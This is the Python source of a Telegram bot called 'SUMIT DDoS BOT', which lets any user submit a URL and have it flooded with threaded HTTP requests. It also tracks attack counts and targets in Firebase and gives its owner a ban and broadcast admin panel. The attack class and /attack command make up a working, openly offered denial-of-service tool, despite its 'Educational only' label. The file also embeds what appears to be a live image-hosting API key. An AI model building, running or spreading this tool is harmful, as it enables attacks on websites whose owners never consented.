#!/usr/bin/env python3
import telebot, threading, time, socket, base64, requests as req, os, uuid, json
from telebot import types
from datetime import datetime
from urllib.parse import urlparse

# ===== CONFIG (YAHI CHANGE KARO) =====
BOT_TOKEN = "YOUR_BOT_TOKEN"
ADMIN_ID = 8931155476
ADMIN_USER = "@SUMIT_X_OFFICIAL"
FIREBASE_URL = "https://YOUR_PROJECT-default-rtdb.firebaseio.com/"
IMGBB_KEY = "99ae48375e2105a9d3006e07fffb7038"
MAX_ATT = 200
# =====================================

bot = telebot.TeleBot(BOT_TOKEN)
active_attacks = {}

class DB:
    def __init__(self,u): self.u=u.rstrip('/')
    def r(self,m,p,d=None):
        try:
            r=req.request(m,f"{self.u}/{p}.json",json=d,timeout=10)
            return r.json() if r.text else {}
        except: return None
    def add(self,uid,un="Unknown"):
        if not self.r("GET",f"users/{uid}"):
            self.r("PUT",f"users/{uid}",{"username":un,"user_id":uid,"first":datetime.now().isoformat(),"att":0,"ban":False,"reason":""})
    def get(self,uid): return self.r("GET",f"users/{uid}")
    def up_att(self,uid,c): self.r("PUT",f"users/{uid}/att",c)
    def att(self,uid): u=self.get(uid); return u.get("att",0) if u else 0
    def ban(self,uid,r=""): self.r("PATCH",f"users/{uid}",{"ban":True,"reason":r})
    def unban(self,uid): self.r("PATCH",f"users/{uid}",{"ban":False,"reason":""})
    def banned(self,uid): u=self.get(uid); return u.get("ban",False) if u else False
    def all(self): return self.r("GET","users") or {}
    def t_users(self): return len(self.all())
    def t_att(self):
        t=0
        for u,d in self.all().items():
            if isinstance(d,dict): t+=d.get("att",0)
        return t
    def log(self,uid,target,status):
        l=self.r("GET",f"logs/{uid}") or {}
        lid=str(uuid.uuid4())[:8]; l[lid]={"time":datetime.now().isoformat(),"target":target,"status":status}
        self.r("PUT",f"logs/{uid}",l)
    def logs(self,uid): return self.r("GET",f"logs/{uid}") or {}

db = DB(FIREBASE_URL)

class ATK:
    def __init__(self): self.stop=False; self.c=0; self.ip=None; self.p=80
    def res(self,url):
        if not url.startswith(('http://','https://')): url='http://'+url
        p=urlparse(url)
        try: self.ip=socket.gethostbyname(p.hostname); self.p=p.port or 80; return True
        except: return False
    def f(self,t):
        while not self.stop and self.c<200:
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(3)
                s.connect((self.ip,self.p)); s.send(f"GET / HTTP/1.1\r\nHost: {self.ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n".encode())
                self.c+=1; s.close(); time.sleep(0.05)
            except: pass
    def start(self,th=50):
        self.stop=False; self.c=0; tl=[]
        for i in range(th): t=threading.Thread(target=self.f,args=(i,)); t.daemon=True; tl.append(t); t.start()
        while self.c<200 and not self.stop: time.sleep(0.5)
        self.stop=True; return self.c

def up_img(data):
    try:
        r=req.post("https://api.imgbb.com/1/upload",data={"key":IMGBB_KEY,"image":base64.b64encode(data).decode()},timeout=30); j=r.json()
        return (j["data"]["url"],None) if j.get("success") else (None,"Upload fail")
    except Exception as e: return None,str(e)

def fetch(url):
    if not url.startswith(('http://','https://')): url='https://'+url
    try:
        r=req.get(url,headers={"User-Agent":"Mozilla/5.0"},timeout=30); r.raise_for_status()
        fn=f"src_{url.replace('https://','').replace('http://','').replace('.','_').replace('/','_')}.html"
        with open(fn,'w',encoding='utf-8') as f: f.write(r.text)
        return {"file":fn,"content":r.text,"size":len(r.text)},None
    except Exception as e: return None,str(e)

def mk():
    m=types.ReplyKeyboardMarkup(row_width=2,resize_keyboard=True)
    m.add("💥 Attack","📊 Stats","🖼️ ImgToURL","🌐 Render","📚 Help","👑 Admin"); return m

def ck():
    m=types.ReplyKeyboardMarkup(row_width=1,resize_keyboard=True); m.add("❌ Cancel"); return m

@bot.message_handler(commands=['start'])
def start(m):
    uid=m.from_user.id; un=m.from_user.username or "Unknown"; db.add(uid,un)
    if db.banned(uid): return bot.reply_to(m,"❌ *Banned!* Contact admin.",parse_mode="Markdown")
    bot.send_message(m.chat.id,f"🔥 *SUMIT DDoS BOT* 🔥\n\n⚠️ Educational only!\n\n💥 /attack <url>\n📊 /stats\n🖼️ /imgtourl\n🌐 /render <url>\n📚 /help\n\n👑 {ADMIN_USER}",parse_mode="Markdown",reply_markup=mk())

@bot.message_handler(commands=['help'])
def help(m):
    if db.banned(m.from_user.id): return
    bot.reply_to(m,f"📚 *HELP*\n\n💥 /attack <url> - DDoS (200 auto-stop)\n📊 /stats - Your stats\n🖼️ /imgtourl - Image to URL\n🌐 /render <url> - Source code\n\n⚠️ Educational only\n👑 {ADMIN_USER}",parse_mode="Markdown",reply_markup=mk())

@bot.message_handler(commands=['stats'])
def stats(m):
    uid=m.from_user.id
    if db.banned(uid): return bot.reply_to(m,"❌ Banned!",parse_mode="Markdown")
    a=db.att(uid); tu=db.t_users(); ta=db.t_att()
    bot.reply_to(m,f"📊 *STATS*\n\n👤 `{uid}`\n💥 `{a}/{MAX_ATT}`\n🌍 Users: `{tu}`\n🌍 Attacks: `{ta}`",parse_mode="Markdown",reply_markup=mk())

@bot.message_handler(commands=['attack'])
def attack(m):
    uid=m.from_user.id
    if db.banned(uid): return bot.reply_to(m,"❌ Banned!",parse_mode="Markdown")
    if db.att(uid)>=MAX_ATT: return bot.reply_to(m,f"❌ Limit! `{MAX_ATT}/{MAX_ATT}`",parse_mode="Markdown")
    if uid in active_attacks and active_attacks[uid]: return bot.reply_to(m,"❌ Already attacking!",parse_mode="Markdown")
    mm=bot.reply_to(m,"🌐 *URL likho:*\n`example.com`",parse_mode="Markdown",reply_markup=ck())
    bot.register_next_step_handler(mm,proc_att)

def proc_att(m):
    uid=m.from_user.id; url=m.text.strip()
    if url.lower() in ['❌ cancel','/cancel','cancel']: return bot.reply_to(m,"✅ Cancelled!",reply_markup=mk())
    if url.startswith('/'): return bot.reply_to(m,"❌ Invalid!",reply_markup=mk())
    e=ATK()
    if not e.res(url): return bot.reply_to(m,"❌ Invalid URL!",reply_markup=mk())
    bot.send_message(m.chat.id,f"🔥 *Started!*\n🎯 `{url}`\n🌐 `{e.ip}:{e.p}`\n✅ Auto-stop 200",parse_mode="Markdown")
    active_attacks[uid]=True
    def run():
        try:
            t=e.start(); c=db.att(uid); db.up_att(uid,c+t); db.log(uid,url,"done")
            bot.send_message(m.chat.id,f"✅ *Done!* 💥 `{t}` req\n📊 `{db.att(uid)}/{MAX_ATT}`",parse_mode="Markdown",reply_markup=mk())
        except Exception as ex: bot.send_message(m.chat.id,f"❌ `{ex}`",parse_mode="Markdown",reply_markup=mk())
        finally: active_attacks[uid]=False
    threading.Thread(target=run,daemon=True).start()

@bot.message_handler(commands=['imgtourl'])
def img(m):
    if db.banned(m.from_user.id): return bot.reply_to(m,"❌ Banned!",parse_mode="Markdown")
    mm=bot.reply_to(m,"🖼️ *Image send karo*",parse_mode="Markdown",reply_markup=ck())
    bot.register_next_step_handler(mm,proc_img)

def proc_img(m):
    if m.text and m.text.strip().lower() in ['❌ cancel','/cancel','cancel']: return bot.reply_to(m,"✅ Cancelled!",reply_markup=mk())
    if m.photo:
        fi=m.photo[-1].file_id; f2=bot.get_file(fi); d=bot.download_file(f2.file_path)
        u,e=up_img(d)
        if u: bot.send_message(m.chat.id,f"✅ *Uploaded!*\n📎 `{u}`",parse_mode="Markdown",reply_markup=mk())
        else: bot.reply_to(m,f"❌ {e}",reply_markup=mk())
        return
    if m.text and (m.text.startswith('http://') or m.text.startswith('https://')):
        try: r=req.get(m.text,timeout=30); u,e=up_img(r.content)
        except: return bot.reply_to(m,"❌ Failed!",reply_markup=mk())
        if u: bot.send_message(m.chat.id,f"✅ *Uploaded!*\n📎 `{u}`",parse_mode="Markdown",reply_markup=mk())
        else: bot.reply_to(m,f"❌ {e}",reply_markup=mk())
        return
    bot.reply_to(m,"❌ Image nahi mili!",reply_markup=mk())

@bot.message_handler(commands=['render'])
def render(m):
    if db.banned(m.from_user.id): return bot.reply_to(m,"❌ Banned!",parse_mode="Markdown")
    mm=bot.reply_to(m,"🌐 *URL likho:*",parse_mode="Markdown",reply_markup=ck())
    bot.register_next_step_handler(mm,proc_ren)

def proc_ren(m):
    url=m.text.strip()
    if url.lower() in ['❌ cancel','/cancel','cancel']: return bot.reply_to(m,"✅ Cancelled!",reply_markup=mk())
    if url.startswith('/'): return bot.reply_to(m,"❌ Invalid!",reply_markup=mk())
    st=bot.reply_to(m,"⏳ Fetching...",parse_mode="Markdown")
    r,e=fetch(url)
    if e: return bot.edit_message_text(f"❌ {e}",m.chat.id,st.message_id,reply_markup=mk())
    try:
        with open(r['file'],'rb') as f: bot.send_document(m.chat.id,f,caption=f"✅ `{url}`\n📏 {r['size']} bytes",parse_mode="Markdown")
        os.remove(r['file'])
    except: bot.send_message(m.chat.id,f"```html\n{r['content'][:2000]}\n```",parse_mode="Markdown")
    bot.delete_message(m.chat.id,st.message_id); bot.send_message(m.chat.id,"✅ Done!",reply_markup=mk())

# ===== ADMIN PANEL =====
@bot.message_handler(commands=['admin','sofficial'])
def admin(m):
    if m.from_user.id!=ADMIN_ID: return bot.reply_to(m,"❌ *Unauthorized!*",parse_mode="Markdown")
    allu=db.all(); tu=len(allu); ta=0; ac=0; bl=0
    for uid,d in allu.items():
        if isinstance(d,dict): ta+=d.get("att",0); ac+=1 if d.get("att",0)>0 else 0; bl+=1 if d.get("ban") else 0
    txt=f"👑 *ADMIN PANEL*\n\n📊 Stats:\n👥 `{tu}` | ⚡ `{ac}` | 💥 `{ta}` | 🚫 `{bl}`\n\n👤 {ADMIN_USER} (`{ADMIN_ID}`)\n\n📋 /ban <id> [r]\n/unban <id>\n/userinfo <id>\n/users\n/banned\n/logs <id>\n/broadcast <msg>"
    mk=types.InlineKeyboardMarkup(row_width=2)
    mk.add(types.InlineKeyboardButton("📊 Stats",callback_data="st"),types.InlineKeyboardButton("🚫 Ban List",callback_data="bl"),types.InlineKeyboardButton("👥 Users",callback_data="us"),types.InlineKeyboardButton("📢 Broadcast",callback_data="bc"),types.InlineKeyboardButton("🔍 UserInfo",callback_data="ui"),types.InlineKeyboardButton("📜 Logs",callback_data="lg"),types.InlineKeyboardButton("🔄 Refresh",callback_data="rf"),types.InlineKeyboardButton("❌ Close",callback_data="cl"))
    try:
        with open("admin.jpg","rb") as f: bot.send_photo(m.chat.id,f,caption=txt,parse_mode="Markdown",reply_markup=mk)
    except: bot.send_message(m.chat.id,txt,parse_mode="Markdown",reply_markup=mk)

@bot.callback_query_handler(func=lambda c:True)
def cb(c):
    if c.from_user.id!=ADMIN_ID: return bot.answer_callback_query(c.id,"❌ Unauthorized!")
    allu=db.all(); tu=len(allu); ta=0; ac=0; bl=0
    for uid,d in allu.items():
        if isinstance(d,dict): ta+=d.get("att",0); ac+=1 if d.get("att",0)>0 else 0; bl+=1 if d.get("ban") else 0
    
    if c.data=="st":
        bot.edit_message_text(f"📊 *STATS*\n👥 `{tu}`\n⚡ `{ac}`\n💥 `{ta}`\n🚫 `{bl}`\n🟢 Online ✅",c.message.chat.id,c.message.message_id,parse_mode="Markdown")
        bot.answer_callback_query(c.id,"✅")
    elif c.data=="bl":
        bd=[(uid,d) for uid,d in allu.items() if isinstance(d,dict) and d.get("ban")]
        if not bd: bot.edit_message_text("✅ *Koi banned nahi!*",c.message.chat.id,c.message.message_id,parse_mode="Markdown")
        else:
            txt=f"🚫 *BANNED* ({len(bd)})\n\n"
            for uid,d in bd: txt+=f"👤 `{uid}` @{d.get('username','?')}\n📝 `{d.get('reason','N/A')}`\n━━━━━━━━━━\n"
            bot.edit_message_text(txt,c.message.chat.id,c.message.message_id,parse_mode="Markdown")
        bot.answer_callback_query(c.id,f"{len(bd)} banned")
    elif c.data=="us":
        if not allu: bot.edit_message_text("❌ No users!",c.message.chat.id,c.message.message_id,parse_mode="Markdown")
        else:
            txt=f"👥 *USERS* ({tu})\n\n"; cnt=0
            for uid,d in allu.items():
                if cnt>=20: txt+=f"\n... aur {tu-20}"; break
                if isinstance(d,dict): txt+=f"{'🚫' if d.get('ban') else '✅'} `{uid}` @{d.get('username','?')} `{d.get('att',0)}`\n"; cnt+=1
            bot.edit_message_text(txt,c.message.chat.id,c.message.message_id,parse_mode="Markdown")
        bot.answer_callback_query(c.id,f"{tu} users")
    elif c.data=="bc":
        m=bot.send_message(c.message.chat.id,"📢 *Broadcast likho:*",parse_mode="Markdown",reply_markup=ck())
        bot.register_next_step_handler(m,proc_bc)
        bot.answer_callback_query(c.id,"Type msg")
    elif c.data=="ui":
        m=bot.send_message(c.message.chat.id,"🔍 *User ID:*",parse_mode="Markdown",reply_markup=ck())
        bot.register_next_step_handler(m,proc_ui)
        bot.answer_callback_query(c.id,"Enter ID")
    elif c.data=="lg":
        m=bot.send_message(c.message.chat.id,"📜 *User ID:*",parse_mode="Markdown",reply_markup=ck())
        bot.register_next_step_handler(m,proc_lg)
        bot.answer_callback_query(c.id,"Enter ID")
    elif c.data=="rf":
        bot.delete_message(c.message.chat.id,c.message.message_id)
        admin(c.message)
        bot.answer_callback_query(c.id,"🔄 Refreshed!")
    elif c.data=="cl":
        bot.delete_message(c.message.chat.id,c.message.message_id)
        bot.send_message(c.message.chat.id,"✅ Closed!",reply_markup=mk())
        bot.answer_callback_query(c.id,"Closed")

def proc_bc(m):
    t=m.text.strip()
    if t.lower() in ['❌ cancel','/cancel','cancel']: return bot.reply_to(m,"✅ Cancelled!",reply_markup=mk())
    allu=db.all(); s=0; f=0
    for uid in allu:
        try: bot.send_message(int(uid),f"📢 *BROADCAST*\n\n{t}\n\n— {ADMIN_USER}",parse_mode="Markdown"); s+=1
        except: f+=1
    bot.reply_to(m,f"✅ *Done*\n📨 Sent: `{s}`\n❌ Failed: `{f}`",parse_mode="Markdown",reply_markup=mk())

def proc_ui(m):
    t=m.text.strip()
    if t.lower() in ['❌ cancel','/cancel','cancel']: return bot.reply_to(m,"✅ Cancelled!",reply_markup=mk())
    try: uid=int(t)
    except: return bot.reply_to(m,"❌ Invalid ID!",reply_markup=mk())
    d=db.get(uid)
    if not d: return bot.reply_to(m,f"❌ `{uid}` nahi mila!",parse_mode="Markdown",reply_markup=mk())
    l=db.logs(uid)
    bot.reply_to(m,f"👤 *INFO*\n🆔 `{uid}`\n📛 @{d.get('username','?')}\n💥 `{d.get('att',0)}`\n🚫 {'Yes' if d.get('ban') else 'No'}\n📝 `{d.get('reason','N/A')}`\n📅 `{d.get('first','?')}`\n📜 `{len(l)}` logs",parse_mode="Markdown",reply_markup=mk())

def proc_lg(m):
    t=m.text.strip()
    if t.lower() in ['❌ cancel','/cancel','cancel']: return bot.reply_to(m,"✅ Cancelled!",reply_markup=mk())
    try: uid=int(t)
    except: return bot.reply_to(m,"❌ Invalid ID!",reply_markup=mk())
    l=db.logs(uid)
    if not l: return bot.reply_to(m,f"📜 `{uid}` no logs.",parse_mode="Markdown",reply_markup=mk())
    txt=f"📜 *LOGS* `{uid}` ({len(l)})\n\n"
    for lid,log in list(l.items())[:10]: txt+=f"🎯 `{log.get('target','?')}` ⏱️ `{log.get('time','?')}` 📊 `{log.get('status','?')}`\n"
    if len(l)>10: txt+=f"\n... aur {len(l)-10}"
    bot.reply_to(m,txt,parse_mode="Markdown",reply_markup=mk())

@bot.message_handler(commands=['ban'])
def ban(m):
    if m.from_user.id!=ADMIN_ID: return bot.reply_to(m,"❌ Unauthorized!",parse_mode="Markdown")
    p=m.text.split(maxsplit=2)
    if len(p)<2: return bot.reply_to(m,"❌ /ban <id> [reason]")
    try:
        tid=int(p[1]); r=p[2] if len(p)>2 else "Violation"; db.ban(tid,r)
        bot.reply_to(m,f"✅ *Banned!*\n👤 `{tid}`\n📝 `{r}`",parse_mode="Markdown")
        try: bot.send_message(tid,f"❌ *Banned!*\nReason: `{r}`\nContact: {ADMIN_USER}",parse_mode="Markdown")
        except: pass
    except: bot.reply_to(m,"❌ Invalid ID!",reply_markup=mk())

@bot.message_handler(commands=['unban'])
def unban(m):
    if m.from_user.id!=ADMIN_ID: return bot.reply_to(m,"❌ Unauthorized!",parse_mode="Markdown")
    p=m.text.split()
    if len(p)<2: return bot.reply_to(m,"❌ /unban <id>")
    try: tid=int(p[1]); db.unban(tid); bot.reply_to(m,f"✅ *Unbanned!*\n👤 `{tid}`",parse_mode="Markdown")
    except: bot.reply_to(m,"❌ Invalid ID!",reply_markup=mk())

@bot.message_handler(commands=['userinfo'])
def uinfo(m):
    if m.from_user.id!=ADMIN_ID: return bot.reply_to(m,"❌ Unauthorized!",parse_mode="Markdown")
    p=m.text.split()
    if len(p)<2: return bot.reply_to(m,"❌ /userinfo <id>")
    try: uid=int(p[1])
    except: return bot.reply_to(m,"❌ Invalid ID!",reply_markup=mk())
    d=db.get(uid)
    if not d: return bot.reply_to(m,f"❌ `{uid}` nahi mila!",parse_mode="Markdown")
    l=db.logs(uid)
    bot.reply_to(m,f"👤 *INFO*\n🆔 `{uid}`\n📛 @{d.get('username','?')}\n💥 `{d.get('att',0)}`\n🚫 {'Yes' if d.get('ban') else 'No'}\n📝 `{d.get('reason','N/A')}`\n📅 `{d.get('first','?')}`\n📜 `{len(l)}` logs",parse_mode="Markdown")

@bot.message_handler(commands=['users'])
def users(m):
    if m.from_user.id!=ADMIN_ID: return bot.reply_to(m,"❌ Unauthorized!",parse_mode="Markdown")
    allu=db.all()
    if not allu: return bot.reply_to(m,"❌ No users!",parse_mode="Markdown")
    txt=f"👥 *USERS* ({len(allu)})\n\n"; cnt=0
    for uid,d in allu.items():
        if cnt>=30: txt+=f"\n... aur {len(allu)-30}"; break
        if isinstance(d,dict): txt+=f"{'🚫' if d.get('ban') else '✅'} `{uid}` @{d.get('username','?')} `{d.get('att',0)}`\n"; cnt+=1
    bot.reply_to(m,txt,parse_mode="Markdown")

@bot.message_handler(commands=['banned'])
def banned(m):
    if m.from_user.id!=ADMIN_ID: return bot.reply_to(m,"❌ Unauthorized!",parse_mode="Markdown")
    allu=db.all(); bd=[(uid,d) for uid,d in allu.items() if isinstance(d,dict) and d.get("ban")]
    if not bd: return bot.reply_to(m,"✅ *Koi banned nahi!*",parse_mode="Markdown")
    txt=f"🚫 *BANNED* ({len(bd)})\n\n"
    for uid,d in bd: txt+=f"👤 `{uid}` @{d.get('username','?')}\n📝 `{d.get('reason','N/A')}`\n━━━━━━━━━━\n"
    bot.reply_to(m,txt,parse_mode="Markdown")

@bot.message_handler(commands=['logs'])
def logs(m):
    if m.from_user.id!=ADMIN_ID: return bot.reply_to(m,"❌ Unauthorized!",parse_mode="Markdown")
    p=m.text.split()
    if len(p)<2: return bot.reply_to(m,"❌ /logs <id>")
    try: uid=int(p[1])
    except: return bot.reply_to(m,"❌ Invalid ID!")
    l=db.logs(uid)
    if not l: return bot.reply_to(m,f"📜 `{uid}` no logs.",parse_mode="Markdown")
    txt=f"📜 *LOGS* `{uid}` ({len(l)})\n\n"
    for lid,log in list(l.items())[:10]: txt+=f"🎯 `{log.get('target','?')}` ⏱️ `{log.get('time','?')}` 📊 `{log.get('status','?')}`\n"
    if len(l)>10: txt+=f"\n... aur {len(l)-10}"
    bot.reply_to(m,txt,parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast(m):
    if m.from_user.id!=ADMIN_ID: return bot.reply_to(m,"❌ Unauthorized!",parse_mode="Markdown")
    p=m.text.split(maxsplit=1)
    if len(p)<2: return bot.reply_to(m,"❌ /broadcast <msg>")
    msg=p[1]; allu=db.all(); s=0; f=0
    for uid in allu:
        try: bot.send_message(int(uid),f"📢 *BROADCAST*\n\n{msg}\n\n— {ADMIN_USER}",parse_mode="Markdown"); s+=1
        except: f+=1
    bot.reply_to(m,f"✅ *Done*\n📨 Sent: `{s}`\n❌ Failed: `{f}`",parse_mode="Markdown")

@bot.message_handler(func=lambda m:True)
def txt(m):
    uid=m.from_user.id
    if db.banned(uid): return bot.reply_to(m,"❌ Banned!",parse_mode="Markdown")
    t=m.text.strip()
    if t=="💥 Attack": attack(m)
    elif t=="📊 Stats": stats(m)
    elif t=="🖼️ ImgToURL": img(m)
    elif t=="🌐 Render": render(m)
    elif t=="📚 Help": help(m)
    elif t=="👑 Admin": admin(m)
    elif t=="❌ Cancel": bot.reply_to(m,"✅ Cancelled!",reply_markup=mk())
    else: bot.reply_to(m,"❌ ? /help",reply_markup=mk())

print(f"✅ SUMIT BOT v3.0 | Owner: {ADMIN_USER}")
print(f"⚠️ Educational Purpose Only")
try:
    bot.infinity_polling(timeout=60)
except KeyboardInterrupt: print("\n[!] Stopped")
except Exception as e: print(f"[!] Error: {e}")
